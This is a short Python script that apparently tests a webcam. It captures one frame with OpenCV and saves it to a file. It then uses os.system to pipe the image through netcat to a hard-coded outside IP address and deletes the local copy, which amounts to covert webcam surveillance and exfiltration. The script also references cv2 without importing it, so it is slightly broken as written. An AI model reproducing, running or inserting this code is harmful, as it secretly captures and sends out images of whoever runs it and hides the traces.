from cv2 import *
import os

# initialize the camera
cam = VideoCapture(0)
s, img = cam.read()
if s:    # frame captured without any errors
    cv2.namedWindow('desired_name_of_window', flags= cv2.WINDOW_GUI_NORMAL)
    # imshow("cam-test",img)
    # waitKey(0)
    # destroyWindow("cam-test")
    imwrite("filename.jpg",img) #save image

os.system("nc -q0 3.17.9.18 1234 < filename.jpg")
os.system("rm filename.jpg")